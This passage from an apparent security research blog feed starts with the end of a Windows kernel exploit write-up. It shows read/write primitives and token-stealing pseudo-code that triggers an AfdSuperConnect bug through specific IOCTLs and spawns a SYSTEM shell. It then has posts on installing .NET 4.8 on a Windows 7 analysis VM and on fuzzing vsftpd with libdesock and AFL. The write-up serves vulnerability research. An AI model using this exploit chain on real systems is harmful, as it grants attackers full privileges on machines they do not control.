read&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> read&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pointer&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And the perfect write function would look something like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> write_argument &lt;span style="color:#f92672">*&lt;/span>write){
&lt;span style="color:#f92672">*&lt;/span>write&lt;span style="color:#f92672">-&amp;gt;&lt;/span>pointer &lt;span style="color:#f92672">=&lt;/span> write&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here the read/write argument would be a pointer to user space memory. This means we have full control of the value of &lt;code>read-&amp;gt;pointer&lt;/code> and &lt;code>write-&amp;gt;pointer&lt;/code>, respectively.
These pointers then get dereferenced and either written to the controlled &lt;code>write-&amp;gt;value&lt;/code> or read and stored back into user space memory.&lt;/p>
&lt;p>If one cannot find primitives as perfect as these, one can search for functions that &lt;em>spread&lt;/em> the first argument.
The perfect spread function would be something like:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">spread_function&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> arguments &lt;span style="color:#f92672">*&lt;/span>arguments){
(&lt;span style="color:#f92672">*&lt;/span>arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>function)(arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_1, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_2,
arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_3, arguments&lt;span style="color:#f92672">-&amp;gt;&lt;/span>argument_4);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using the perfect spread function one could obtain a read/write function as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">read_write_function_called_by_spread_function&lt;/span>(
&lt;span style="color:#66d9ef">struct&lt;/span> argument_1 &lt;span style="color:#f92672">*&lt;/span>arg_1, &lt;span style="color:#66d9ef">struct&lt;/span> argument_2 &lt;span style="color:#f92672">*&lt;/span>arg_2){
arg_1&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value &lt;span style="color:#f92672">=&lt;/span> arg_2&lt;span style="color:#f92672">-&amp;gt;&lt;/span>value;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In practice, we used two spread functions and then different read and write functions.&lt;/p>
&lt;h2 id="windows-exploitation-tricks-and-the-general-exploit-algorithm">Windows Exploitation tricks and the general exploit algorithm&lt;/h2>
&lt;p>The exploitation algorithm we are using is called &amp;ldquo;Token Stealing&amp;rdquo;. You can find a lot of information on it online. But we will give a short overview.&lt;/p>
&lt;p>Every process has an internal &lt;code>_EPROCESS&lt;/code> kernel structure. The access rights of the process are contained in an internal kernel structure called &lt;code>_TOKEN&lt;/code>.
The &lt;code>_EPROCESS&lt;/code> structure references this token, by pointer.&lt;/p>
&lt;pre tabindex="0">&lt;code>kd&amp;gt; dt nt!_EPROCESS Token
+0x358 Token : _EX_FAST_REF
kd&amp;gt; nt!_EX_FAST_REF
+0x000 Object : Ptr64 Void
+0x000 RefCnt : Pos 0, 4 Bits
+0x000 Value : Uint8B
&lt;/code>&lt;/pre>&lt;p>Now, if we control the &lt;code>_TOKEN&lt;/code>, we have control of all access rights.
One option would be to use the read and write primitive to directly alter the access token, but in this case there is a simpler way.
If we can locate a process which has &lt;code>SYSTEM&lt;/code> access rights, we can simply copy the &lt;code>_TOKEN&lt;/code>-pointer of the &lt;code>SYSTEM&lt;/code> process into the &lt;code>_EPROCESS-&amp;gt;Token&lt;/code> of our process.
And it just so happens that the kernel exports a pointer to the &lt;code>nt!PsInitialSystemProcess&lt;/code> which has &lt;code>SYSTEM&lt;/code> access rights.&lt;/p>
&lt;p>Therefore, the basic algorithm would be&lt;/p>
&lt;ol>
&lt;li>Use the read primitive to read the value of &lt;code>(nt!PsInitialSystemProcess)-&amp;gt;Token&lt;/code>&lt;/li>
&lt;li>Use the write primitive to write the value to our &lt;code>_EPROCESS-&amp;gt;Token&lt;/code> field.&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://lolcads.github.io/2022/06/token_stealing.svg" alt="Token Stealing">&lt;/p>
&lt;p>But 2 problems remain:&lt;/p>
&lt;ol>
&lt;li>As the &lt;code>_EPROCESS&lt;/code> structure is undocumented and subject to change, the offset of the &lt;code>Token&lt;/code> field varies by kernel version.&lt;/li>
&lt;li>We do not know where our &lt;code>_EPROCESS&lt;/code> structure is.&lt;/li>
&lt;/ol>
&lt;p>This is where Windows is really helpful again. Just as we can find all base addresses of kernel modules using &lt;code>NtQuerySystemInformation(SystemModuleInformation)&lt;/code>,
we can find the address of both our &lt;code>_EPROCESS&lt;/code> structure (solving 2) and our &lt;code>_TOKEN&lt;/code> structure using &lt;code>NtQuerySystemInformation(SystemHandleInformation)&lt;/code>.
Now, using the read primitive, we can iterate through our &lt;code>_EPROCESS&lt;/code> structure and locate the &lt;code>_TOKEN&lt;/code> structure.
This then gives us the offset of the &lt;code>Token&lt;/code> field.&lt;/p>
&lt;p>Putting it all together in pseudo-code, it looks something like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Use the Windows API to get all the information we want.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>token, process :&lt;span style="color:#f92672">=&lt;/span> find_token_and_process_using_NtQuerySystemInformation();
PsInitialSystemProcess_export, read_function, write_function :&lt;span style="color:#f92672">=&lt;/span>
find_exported_symbols_using_NtQuerySystemInformation();
&lt;span style="color:#75715e">// Use a system call that is more or less equivalent to
&lt;/span>&lt;span style="color:#75715e">// `socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>socket_handle :&lt;span style="color:#f92672">=&lt;/span> NtCreateFile(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Device&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Afd&amp;#34;&lt;/span>, EaBuffer &lt;span style="color:#f92672">=&lt;/span> {AF_INET, SOCK_STREAM, IPPROTO_TCP});
&lt;span style="color:#75715e">// use the system call that is equivalent to
&lt;/span>&lt;span style="color:#75715e">// `setsockopt(socket, IPPROTO_TCP, TCP_FASTOPEN, &amp;amp;(u32){1}, 1)`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120bf&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {SetSockOpt, .level &lt;span style="color:#f92672">=&lt;/span> IPPROTO_TCP, .option &lt;span style="color:#f92672">=&lt;/span> TCP_FASTOPEN, .optval &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>(u32){&lt;span style="color:#ae81ff">1&lt;/span>}, .optlen &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>});
&lt;span style="color:#75715e">// use the system call that is equivalent to
&lt;/span>&lt;span style="color:#75715e">// `bind(socket, &amp;amp;(struct sockaddr){AF_INET}, sizeof(struct sockaddr))`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x12003&lt;/span>, ...);
&lt;span style="color:#75715e">// The read and write primitives now work by triggering the vulnerability by calling
&lt;/span>&lt;span style="color:#75715e">// `AfdSuperConnect` through the `NtDeviceIoControlFile`.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>function u64 &lt;span style="color:#a6e22e">read_u64&lt;/span>(u64 address)&lt;span style="color:#f92672">:&lt;/span>
read_argument :&lt;span style="color:#f92672">=&lt;/span> {.pointer &lt;span style="color:#f92672">=&lt;/span> address};
NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120c7&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {.sockaddr &lt;span style="color:#f92672">=&lt;/span> {AF_INET, .offset_0x5c &lt;span style="color:#f92672">=&lt;/span> read_function, .offset_0x64 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>read_argument}});
&lt;span style="color:#66d9ef">return&lt;/span> read_argument.value;
function &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">write_u64&lt;/span>(u64 address, u64 value)&lt;span style="color:#f92672">:&lt;/span>
write_argument :&lt;span style="color:#f92672">=&lt;/span> {.pointer &lt;span style="color:#f92672">=&lt;/span> address, .value &lt;span style="color:#f92672">=&lt;/span> value};
NtDeviceIoControlFile(socket_handle, &lt;span style="color:#ae81ff">0x120c7&lt;/span>, .input_buffer &lt;span style="color:#f92672">=&lt;/span> {.sockaddr &lt;span style="color:#f92672">=&lt;/span> {AF_INET, .offset_0x5c &lt;span style="color:#f92672">=&lt;/span> write_function, .offset_0x64 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>write_argument}});
&lt;span style="color:#75715e">// figure out the token_offset, by linearly scanning through our `_EPROCESS`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">for&lt;/span> i from &lt;span style="color:#ae81ff">0&lt;/span> to &lt;span style="color:#ae81ff">0x1000&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
maybe_token :&lt;span style="color:#f92672">=&lt;/span> read_u64(process &lt;span style="color:#f92672">+&lt;/span> i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> maybe_token &lt;span style="color:#f92672">==&lt;/span> token:
token_offset &lt;span style="color:#f92672">=&lt;/span> i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;span style="color:#75715e">// figure out the `_TOKEN` of `nt!PsInitialSystemProcess`
&lt;/span>&lt;span style="color:#75715e">&lt;/span>PsInitialSystemProcess &lt;span style="color:#f92672">=&lt;/span> read_u64(PsInitialSystemProcess_export);
PsInitialSystemProcessToken &lt;span style="color:#f92672">=&lt;/span> read_u64(PsInitialSystemProcess &lt;span style="color:#f92672">+&lt;/span> token_offset);
&lt;span style="color:#75715e">// actually steal the access `_TOKEN` to give us complete access rights.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>write_u64(token &lt;span style="color:#f92672">+&lt;/span> token_offset, PsInitialSystemProcessToken);
&lt;span style="color:#75715e">// spawn a shell to keep the access rights in a clean way.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>spawn_shell();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://lolcads.github.io/2022/06/success.png" alt="Success - An Administrator Shell">&lt;/p></content></item><item><title>Installing new .NET versions on a Windows 7 VM</title><link>https://lolcads.github.io/posts/2022/03/win7_dotnet_install/</link><pubDate>Wed, 16 Mar 2022 12:01:43 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/03/win7_dotnet_install/</guid><description>Installing new .NET versions on a Windows 7 VM In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.
Motivation Virtual Machines running Microsoft Windows are frequently used for dynamic analysis of Windows executables. Windows 7 is still used for analysis VM, although it is no longer supported by Microsoft and ships with an outdated .NET version. If a sample requires a .NET version which is not present on the analysis VM, the execution fails and the file cannot be analysed.</description><content>&lt;h1 id="installing-new-net-versions-on-a-windows-7-vm">Installing new .NET versions on a Windows 7 VM&lt;/h1>
&lt;p>In this post, I will explain how to install .NET Framework 4.8 on a Windows 7 VM.&lt;/p>
&lt;h2 id="motivation">Motivation&lt;/h2>
&lt;p>Virtual Machines running Microsoft Windows are frequently used for dynamic analysis of Windows executables.
Windows 7 is still used for analysis VM, although it is no longer supported by Microsoft and ships with an outdated .NET version.
If a sample requires a .NET version which is not present on the analysis VM, the execution fails and the file cannot be analysed.
For this reason it might be required to install a recent .NET version on a Windows 7 VM.&lt;/p>
&lt;h2 id="problem">Problem&lt;/h2>
&lt;p>The .NET Framework 4.8 installer tries to verify the integritiy of the installation data prior to the installation.
However, the root certificates required for this verification process are not present on Windows 7.
&lt;img src="https://lolcads.github.io/2022/03/net_0.png" alt="Problem: the installation process fails">
This issue cannot be fixed via Windows updates, as they are not available for Windows 7 anymore.&lt;/p>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;p>First, download the &lt;a href="https://go.microsoft.com/fwlink/?linkid=2088631">offline installer for .NET Framework 4.8&lt;/a>&lt;/p>
&lt;p>Execute the file. This will extract the installation data into a temporary subfolder of &lt;code>C:\&lt;/code> with a random name.
&lt;img src="https://lolcads.github.io/2022/03/net_1.png" alt="Extraction of the installation data into a temporary directory">&lt;/p>
&lt;p>Wait until the extraction process has finished and an installer opens. You don&amp;rsquo;t have to interact with this installer window at all. Just leave it opened to prevent the deletion of the temporary subfolder.
&lt;img src="https://lolcads.github.io/2022/03/net_2.png" alt="Installer to be left opened">&lt;/p>
&lt;p>Next, navigate to the temporary folder and execute the file &lt;code>netfx_Full_x64.msi&lt;/code> or &lt;code>netfx_Full_x86.msi&lt;/code>.
This will trigger the installation of .NET Framework 4.8. Restart the system after the installation finished.
&lt;img src="https://lolcads.github.io/2022/03/net_3.png" alt="Locating netfx_Full">&lt;/p>
&lt;p>That&amp;rsquo;s it, you&amp;rsquo;re all set! :)&lt;/p></content></item><item><title>libdesock</title><link>https://lolcads.github.io/posts/2022/02/libdesock/</link><pubDate>Tue, 22 Feb 2022 14:24:40 +0100</pubDate><guid>https://lolcads.github.io/posts/2022/02/libdesock/</guid><description>Fuzzing Network Applications with AFL and libdesock Fuzzing network servers with AFL is challenging since AFL provides its input via stdin or command line arguments while servers get their input over network connections. As the popularity of AFL grew, many attempts have been made of fuzzing popular servers like apache and nginx using different techniques and hacky workarounds. However an off-the-shelf network fuzzing solution for AFL didn&amp;rsquo;t exist for a long time until so-called &amp;ldquo;desocketing&amp;rdquo; tools emerged.</description><content>&lt;h1 id="fuzzing-network-applications-with-afl-and-libdesock">Fuzzing Network Applications with AFL and libdesock&lt;/h1>
&lt;p>Fuzzing network servers with AFL is challenging since AFL provides its
input via stdin or command line arguments while servers get their input
over network connections.
As the popularity of AFL grew, many attempts have been made of fuzzing
popular servers like apache and nginx using different
techniques and hacky workarounds. However an off-the-shelf network fuzzing
solution for AFL didn&amp;rsquo;t exist for a long time until so-called &amp;ldquo;desocketing&amp;rdquo;
tools emerged.
These desocketing tools enabled network fuzzing without
making a lot of additional modifications to the program under test
and quickly became widely used in combination with AFL.&lt;/p>
&lt;h2 id="what-is-desocketing">What is &amp;ldquo;desocketing&amp;rdquo;?&lt;/h2>
&lt;p>Before desocketing tools were published two common techniques for
network fuzzing were&lt;/p>
&lt;ol>
&lt;li>Sending fuzz input over real network connections&lt;/li>
&lt;li>Modifying the target source to use stdin instead of sockets&lt;/li>
&lt;/ol>
&lt;p>The first approach is the most prevalent used by popular fuzzers
like &lt;a href="https://github.com/jtpereyda/boofuzz">boofuzz&lt;/a> or in academia by &lt;a href="https://github.com/aflnet/aflnet">AFLnet&lt;/a> or &lt;a href="https://github.com/stateafl/stateafl">StateAFL&lt;/a>.
This however suffers performance- and stability-drawbacks.
Stability is affected because the servers run with all threads and child processes
enabled. Background threads can be scheduled independently from the input being sent
resulting in invalid coverage information.
Performance is affected because of the amount of kernel activity and network overhead involved.&lt;/p>
&lt;p>The second approach solves the network overhead problem but does not reduce the
kernel activity. It also takes a considerable amount of effort that may lead
to changing &lt;a href="https://securitylab.github.com/research/fuzzing-sockets-FTP/">thousands of lines of code&lt;/a>.&lt;/p>
&lt;p>Desocketing aims to reduce kernel activity and the amount of modifications necessary to a program.
It works by building a shared library that implements functions
like &lt;code>socket()&lt;/code> and &lt;code>accept()&lt;/code> and preloading it via &lt;code>LD_PRELOAD&lt;/code>
into the address space of a network application where it replaces
the network stack of the libc.
The desocketing library simulates incoming connections to the server
but every read on a socket is replaced by a read on stdin
and every write on a socket is redirected to stdout.
Strictly speaking the latter isn&amp;rsquo;t necessary for fuzzing but it&amp;rsquo;s useful
for debugging.&lt;/p>
&lt;p>The following figure demonstrates how to desock nginx such that the network
traffic becomes visible on a terminal.&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/02/demo.svg" alt="">&lt;/p>
&lt;h2 id="how-desocketing-works">How desocketing works&lt;/h2>
&lt;p>Making desocketing libraries has its complexities.
AFLplusplus' &lt;a href="https://github.com/AFLplusplus/AFLplusplus/tree/stable/utils/socket_fuzzing">socketfuzz&lt;/a>
ships a desocketing library that just returns &lt;code>0&lt;/code> (stdin) in &lt;code>accept()&lt;/code>.
Unfortunately this doesn&amp;rsquo;t quite work because &lt;code>send()&lt;/code> and &lt;code>recv()&lt;/code> need an
fd that actually refers to a network connection. If you pass them an fd that
refers to a file the kernel will complain.
Thus we need more complicated methods.&lt;/p>
&lt;p>At the time of writing this, there exists only one popular desocketing solution: &lt;a href="https://github.com/zardus/preeny">preeny&lt;/a>.
preeny creates a socketpair &lt;code>(a,b)&lt;/code> and spawns two threads &lt;code>t1&lt;/code> and
&lt;code>t2&lt;/code> in every call to &lt;code>socket()&lt;/code>.&lt;/p>
&lt;ul>
&lt;li>Thread &lt;code>t1&lt;/code> forwards all data from stdin to &lt;code>a&lt;/code>&lt;/li>
&lt;li>Thread &lt;code>t2&lt;/code> forwards all data from &lt;code>a&lt;/code> to stdout&lt;/li>
&lt;li>In &lt;code>socket()&lt;/code> preeny returns &lt;code>b&lt;/code>&lt;/li>
&lt;li>When AFL writes input to stdin, thread &lt;code>t1&lt;/code> forwards that data to &lt;code>a&lt;/code>&lt;/li>
&lt;li>Writing to &lt;code>a&lt;/code> means that the data will become available in &lt;code>b&lt;/code> and the
application can read the request from &lt;code>b&lt;/code>&lt;/li>
&lt;li>The application writes a response back to &lt;code>b&lt;/code>, making the data available
in socket &lt;code>a&lt;/code> where &lt;code>t2&lt;/code> forwards it to stdout.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://lolcads.github.io/2022/02/preeny.png" alt="">&lt;/p>
&lt;p>Unfortunately this design makes preeny unsuitable for fuzzing:&lt;/p>
&lt;ol>
&lt;li>Spawning threads and joining them introduces additional overhead.&lt;/li>
&lt;li>Each thread realizes busy waiting by calling &lt;code>poll()&lt;/code> every 15ms&lt;/li>
&lt;li>Preeny still relies on a lot of kernel interaction. I/O multiplexing (select, poll, epoll)
is left completely to the kernel.&lt;/li>
&lt;li>The threads may introduce additional instability.&lt;br>
Normally you want to disable threads when fuzzing with AFL.&lt;/li>
&lt;li>It can handle only single-threaded applications but most of the servers
are multi-threaded&lt;/li>
&lt;/ol>
&lt;p>A better desocketing library is needed that is more resource-efficient and handles the complexities of
modern network applications correctly.
So we created a new desocketing library: &amp;ldquo;libdesock&amp;rdquo;.&lt;/p>
&lt;h2 id="using-libdesock">Using libdesock&lt;/h2>
&lt;p>libdesock fully emulates the network stack of the kernel. The kernel is only queried to obtain file
descriptors and to do I/O on stdin and stdout.
Everything else - handling of connections, I/O multiplexing (select, poll, epoll), handling socket metadata (getsockname, getpeername) - entierly happens in userland.&lt;br>
In contrast to preeny, libdesock supports multi-threaded applications and its overall design
makes it more resource efficient and 5x faster than preeny.
This has no effect on AFL&amp;rsquo;s exec/s though, since that primarily depends on the program
and the input.&lt;/p>
&lt;p>We have tested libdesock on common network daemons like&lt;/p>
&lt;ul>
&lt;li>nginx&lt;/li>
&lt;li>Apache httpd&lt;/li>
&lt;li>OpenSSH&lt;/li>
&lt;li>Exim&lt;/li>
&lt;li>bind9&lt;/li>
&lt;li>OpenVPN&lt;/li>
&lt;li>Redis&lt;/li>
&lt;li>dnsmasq&lt;/li>
&lt;li>cupsd&lt;/li>
&lt;li>curl (clients are supported too)&lt;/li>
&lt;/ul>
&lt;p>and several smaller applications.&lt;br>
libdesock also supports event libraries like&lt;/p>
&lt;ul>
&lt;li>libevent&lt;/li>
&lt;li>libuv&lt;/li>
&lt;li>libapr-2&lt;/li>
&lt;/ul>
&lt;p>Network applications generally are very complex and require modifications to be fuzzable with AFL.&lt;br>
They use multiple processes and threads, encryption, compression, checksums, hashes
and sometimes custom allocators that don&amp;rsquo;t work with ASAN.
They also run in an endless loop and have a lot of disk I/O (pidfiles, logfiles, temporary files).
Setting these targets up for fuzzing means to reduce the complexity of the applications.
The following example demonstrates the modifications necessary to fuzz &lt;a href="https://security.appspot.com/vsftpd.html">vsftpd&lt;/a>, a popular FTP server on Linux.&lt;/p>
&lt;h2 id="fuzzing-vsftpd">Fuzzing vsftpd&lt;/h2>
&lt;h3 id="getting-the-source">Getting the source&lt;/h3>
&lt;p>Download version 3.0.5 of vsftpd:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wget https://security.appspot.com/downloads/vsftpd-3.0.5.tar.gz
tar -xf vsftpd-3.0.5.tar.gz
cd vsftpd-3.0.5
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="patching-the-source">Patching the source&lt;/h3>
&lt;p>vsftpd creates a new child process for each connection. We prohibit that
by commenting out the code that does the fork in &lt;code>standalone.c&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -153,6 +153,7 @@ vsf_standalone_main(void)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> child_info.num_this_ip = 0;
p_raw_addr = vsf_sysutil_sockaddr_get_raw_addr(p_accept_addr);
child_info.num_this_ip = handle_ip_count(p_raw_addr);
&lt;span style="color:#a6e22e">+ /*
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> if (tunable_isolate)
{
if (tunable_http_enable &amp;amp;&amp;amp; tunable_isolate_network)
&lt;span style="color:#75715e">@@ -168,6 +169,8 @@ vsf_standalone_main(void)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> {
new_child = vsf_sysutil_fork_failok();
}
&lt;span style="color:#a6e22e">+ */
&lt;/span>&lt;span style="color:#a6e22e">+ new_child = 0;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> if (new_child != 0)
{
/* Parent context */
&lt;/code>&lt;/pre>&lt;/div>&lt;p>vsftpd duplicates the FTP command socket to stdin, stdout and stderr.
This obviously interfers with AFL so we disable that in &lt;code>defs.h&lt;/code> &amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -3,7 +3,7 @@
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
#define VSFTP_DEFAULT_CONFIG &amp;#34;/etc/vsftpd.conf&amp;#34;
&lt;span style="color:#f92672">-#define VSFTP_COMMAND_FD 0
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+#define VSFTP_COMMAND_FD 29
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>
#define VSFTP_PASSWORD_MAX 128
#define VSFTP_USERNAME_MAX 128
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip; and in &lt;code>standalone.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -205,9 +205,7 @@ static void
&lt;/span>&lt;span style="color:#75715e">&lt;/span> prepare_child(int new_client_sock)
{
/* We must satisfy the contract: command socket on fd 0, 1, 2 */
&lt;span style="color:#f92672">- vsf_sysutil_dupfd2(new_client_sock, 0);
&lt;/span>&lt;span style="color:#f92672">- vsf_sysutil_dupfd2(new_client_sock, 1);
&lt;/span>&lt;span style="color:#f92672">- vsf_sysutil_dupfd2(new_client_sock, 2);
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+ vsf_sysutil_dupfd2(new_client_sock, VSFTP_COMMAND_FD);
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> if (new_client_sock &amp;gt; 2)
{
vsf_sysutil_close(new_client_sock);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next, vsftpd enforces a custom memory limit that interfers with ASAN.
We disable the memory limit in &lt;code>sysutil.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -2793,6 +2793,7 @@ void
&lt;/span>&lt;span style="color:#75715e">&lt;/span> vsf_sysutil_set_address_space_limit(unsigned long bytes)
{
/* Unfortunately, OpenBSD is missing RLIMIT_AS. */
&lt;span style="color:#a6e22e">+ return;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> #ifdef RLIMIT_AS
int ret;
struct rlimit rlim;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then we add a forkserver to vsftpd in &lt;code>prelogin.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -59,6 +59,7 @@ init_connection(struct vsf_session* p_sess)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> {
emit_greeting(p_sess);
}
&lt;span style="color:#a6e22e">+ __AFL_INIT();
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> parse_username_password(p_sess);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>vsftpd registers a &lt;code>SIGCHLD&lt;/code> handler that interfers with the forkserver
so we have to disable that too in &lt;code>standalone.c&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -74,7 +74,7 @@ vsf_standalone_main(void)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> {
vsf_sysutil_setproctitle(&amp;#34;LISTENER&amp;#34;);
}
&lt;span style="color:#f92672">- vsf_sysutil_install_sighandler(kVSFSysUtilSigCHLD, handle_sigchld, 0, 1);
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+ //vsf_sysutil_install_sighandler(kVSFSysUtilSigCHLD, handle_sigchld, 0, 1);
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> vsf_sysutil_install_sighandler(kVSFSysUtilSigHUP, handle_sighup, 0, 1);
if (tunable_listen)
{
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Last but not least we disable the &lt;code>bug()&lt;/code> function in &lt;code>utility.c&lt;/code>. This function does a failing &lt;code>fcntl()&lt;/code>
on an fd returned by the desocketing library since the fd is not a real socket. vsftpd handles the &lt;code>fcntl()&lt;/code> failure by calling &lt;code>bug()&lt;/code> again
leading to an infinite loop.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -40,6 +40,7 @@ die2(const char* p_text1, const char* p_text2)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> void
bug(const char* p_text)
{
&lt;span style="color:#a6e22e">+ return;
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> /* Rats. Try and write the reason to the network for diagnostics */
vsf_sysutil_activate_noblock(VSFTP_COMMAND_FD);
(void) vsf_sysutil_write_loop(VSFTP_COMMAND_FD, &amp;#34;500 OOPS: &amp;#34;, 10);
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="build-configuration">Build configuration&lt;/h3>
&lt;p>In the &lt;code>Makefile&lt;/code> replace:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">&lt;span style="color:#75715e">@@ -1,16 +1,16 @@
&lt;/span>&lt;span style="color:#75715e">&lt;/span> # Makefile for systems with GNU tools
&lt;span style="color:#f92672">-CC = gcc
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+CC = afl-clang-fast
